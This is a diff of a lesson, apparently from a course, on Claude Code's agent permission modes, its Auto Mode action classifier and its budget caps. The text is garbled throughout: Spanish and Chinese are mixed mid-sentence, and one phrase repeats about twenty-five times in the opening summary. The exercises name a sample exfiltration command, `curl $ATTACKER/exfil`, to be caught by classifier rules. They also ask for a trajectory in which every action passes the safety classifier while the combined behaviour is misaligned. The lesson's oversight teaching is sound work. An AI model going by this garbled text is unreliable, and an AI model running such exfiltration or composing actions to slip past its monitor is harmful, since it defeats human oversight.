@@ -1,6 +1,6 @@
-# Como agente autónomo de Claude Código: Mode de autoridad y Mode automático
+# Modelo de autoridad del agente independiente
 
-> Claude Code  expone siete tipos de permisos. Plan 会在每动作前询问, default sólo se aplicará a las preguntas de movimiento de riesgo, acceptEdits se redactará un documento de aprobación automática, pero todavía se confirmará la ejecución de la carcasa, bypassPermissions 会批准一切──Auto Mode(2026年3月24日) Usar dos fases de la clasificación de seguridad 取代逐动作批准: cada movimiento se ejecutará con un solo token 快速检查; 标记的动作会启动链思深审查──动作预算通过`max_turns`Y `max_budget_usd`强制执行──Auto Mode 以研究预览 形式发布Antropic 已明确表示,clasificador 单独使用并不足──
+> 权限阶梯 de la revisión por movimiento hasta la aprobación de todo 是利用 管理控自治代理 无需询问就能做的方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能执行的模式. 无需询问的模式. 无需查询问的模式.`auto` Módulo de autoridad  con un modelo de clasificador independiente  sustituir por la ratificación de la acción: se realiza en cada acción pre-examinando la acción, y impide cualquier mejora que supere el alcance de la solicitud                                                                                                                                                                                                                                    `max_turns`Y `max_budget_usd`强制执行――:`auto`¿Es posible o no dependerá de si el plan, la organización, el modelo y el proveedorAntropico han afirmado claramente que el clasificador 单独使用并不足──
 
 **类型：**El aprendizaje
 **语言：**Python(stdlib, dos fases simulador de clasificadores)
@@ -11,32 +11,31 @@
 
 El agente de codificación autónoma de tu máquina es una categoría de seguridad independiente. El ataque es ese agente que puede acceder a todo el sistema de archivos, redes, credenciales, clipboard, cualquier pestaña de navegador, cualquier terminal abierto. Bruce Schneier, etc. ya ha señalado públicamente que los agentes de uso de computadoras no son una vez  funciones de los chatbots, sino una nueva herramienta, con una nueva forma de riesgo.
 
-El código de Claude no es un sistema autónomo, sino que tiene la capacidad de crear siete modos: plan → por defecto → acepta Edits → ... → bypassPermissions. Cada tipo de modo se realiza en un proceso de clasificación de dos fases: para el clasificador, el juicio por movimientos seguros, el proceso de transferencia de los usuarios a un camino clave, y al mismo tiempo, para el clasificador, el nivel de conservación de los movimientos de los marcadores.
+El sistema de derechos de Claude Code es una respuesta antropeca. No es un sistema autónomo / no autónomo, sino que tiene la capacidad de crear seis modos: plan → por defecto → acepta Edits → ... → bypassPermissions. Cada tipo de modo se diferencia entre la velocidad y el examen de cada movimiento.
 
 ¿Qué puede captar el sistema, qué pierde, y qué modelo debe utilizar una tarea determinada?
 
 ## 概念
 
-### 七种权限模式
+### 六种权限模式
 
 | 模式 | 行为 | 使用场景 |
 |---|---|---|
 | `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
-| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
+| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
 | `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
-| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
-| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
-| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
+| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
+| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
 | `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |
 
-(en inglés, "Yolo" es un nombre de código abierto de la lengua inglesa.
+(Nombre de arriba con código público de Claude Docs un致;UI 把 `default`标为 Manual。)
 
 ### Una página para entender el modo automático
 
 El modo automático (en inglés Auto Mode, 2026 3 月 24 日发布) es el primer modo de autorización de un modelo.
 
-1. **Stage 1 — single-token classifier。**En cada movimiento propuesto se ejecuta. El costo es bajo. Retorna a "seguro" o "flag" (flag).
-2. **Stage 2 — secondary policy/safety review。**Sólo se ejecuta en movimiento marcado. En torno a la movimiento, sesión, estado actual y declaración de tareas de ejecución de la política de enfoque y evaluación de seguridad. Si la confianza es baja, se actualiza a HITL del usuario.
+1. **一个独立的 classifier model。**En cada movimiento propuesto antes de ejecutarlo, según la declaración de tareas y sesión, el estado actual para juzgar, y evitar cualquier mejora que exceda el alcance de la solicitud.
+2. **受限的可用性。**Sí, no se puede`auto`depende de si el plan 、 organización es activado 、 modelo y proveedor ‖
 
  presupuestario control y clasificador no se encuentran:
 
@@ -64,9 +63,8 @@ En el caso de las aplicaciones de la aplicación de la aplicación de la aplicac
 
 - tareas desconocidas: desde`plan`開始──閱讀計劃比回滚一次糟糕運行更便宜──
 - 已知 refactor:`acceptEdits`能省下大量确认点击──
-- ejecutar trasfondo sin supervisión: sólo en el espacio de trabajo que ya has medido el radio de la explosión`autoMode`(sin credenciales, sin montajes de producción, sin salida de la selección de tu trabajo)
-- Contenedores efémeros: cuando y sólo cuando contenedores y sus credenciales son desechables,`yolo`- ¿ Qué ?`bypassPermissions`Sólo puedo aceptarlo.
-
+- ejecutar trasfondo sin supervisión: sólo en el espacio de trabajo que ya has medido el radio de la explosión`auto`(sin credenciales, sin montajes de producción, sin salida de la selección de tu trabajo)
+- Contenedores efémeros: cuando y sólo cuando contenedores y sus credenciales son desechables,`dontAsk`- ¿ Qué ?`bypassPermissions`Sólo puedo aceptarlo.
 
 ```figure
 autonomy-oversight
@@ -74,7 +72,7 @@ autonomy-oversight
 
 ## Usalo
 
-`code/main.py`模拟两阶段分类器. La primera etapa es dirigida a la regla de palabras clave baratas de los movimientos propuestos. La segunda etapa es el revisor de reglas múltiples más lento.
+`code/main.py`Colocar un clasificador de revisión de acción 模拟成两阶段管线 es una simplificación de la enseñanza; real `auto`模式背后 es un modelo de clasificador independiente, en lugar de tener dos fases de acuerdo documental. La etapa 1 es una regla de palabras clave baratas dirigida a la acción propuesta. La etapa 2 es un revisor de reglas múltiples más lento.
 
 ##  entregarlo
 
@@ -86,23 +84,23 @@ autonomy-oversight
 
 2. 扩展 1 juego de reglas de la etapa, para capturar una determinada forma conocida-mala, por ejemplo `curl $ATTACKER/exfil`En la muestra de acción benigna, la tasa de falsos positivos se mide.
 
-3. 阅读 Antropic's "Cómo funciona el bucle del agente" 文档──列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行 `autoMode`¿Qué necesitas para una puerta?
+3. 阅读 Antropic's "Cómo funciona el bucle del agente" 文档──列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行 `auto`¿Qué necesitas para una puerta?
 
 4. 设计一个 24 小时 无监督运行预算:`max_turns`¿Qué es esto?`max_budget_usd`、 por herramienta caps、allowlists―说明每个数字的理由―
 
-5. 描述一个轨迹: cada uno de ellos fue aprobado en la etapa 1 y la etapa 2, pero el comportamiento de la combinación fue desalineado.
+5. 描述一个轨迹: de ellos cada uno de los individuos movimientos fueron clasificados 批准, pero el comportamiento de la combinación fue desalineado.
 
 ## 关键术语: "El hombre es un hombre"
 
 | 术语 | 人们常说 | 实际含义 |
 |---|---|---|
-| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
+| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
 | plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
 | acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
-| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
+| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
 | bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
-| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
-| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
+| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
+| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
 | Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |
 
 ## 延伸阅读
